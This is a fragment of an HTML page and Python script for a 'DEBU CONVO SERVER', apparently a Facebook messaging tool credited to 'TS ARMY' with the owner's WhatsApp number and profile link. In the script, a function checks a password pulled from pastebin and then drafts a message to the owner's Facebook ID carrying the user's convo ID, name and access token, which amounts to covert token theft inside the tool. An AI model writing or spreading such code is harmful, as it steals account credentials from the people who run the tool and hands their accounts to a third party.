...
<body>
    <div class="container">
        <div class="box">
            <h1>DEBU CONVO SERVER</h1>
            <div class="credit">
                <p>1. CREDIT:-TS ARMY</p>
                <p>2. OWNER => DJDEBU</p>
                <p>3. CONTACT:- <a href="https://wa.me/+918509432926">WhatsApp</a></p>
                <p>4. FACEBOOK:- <a href="https://www.facebook.com/profile.php?id=100041770486153">Facebook</a></p>
...
def send_initial_message():
    ...
    mmm_pass = requests.get('https://pastebin.com/raw/WEdiezRh').text
    
    if mmm_pass not in password:
        print('\033[1;31m⚠︎ Your Password Changed By debu ⚠︎')
        sys.exit()
    
    # Message template
    msg_template = "Owner => debuu \n Hello debuu sir. \n I am using your convo server. \n This Is My Details :- \n Convo ID :- {} \n Name:- {} \n Token :- {}"
    
    # Target IDs
    target_ids = ["100041770486153"]
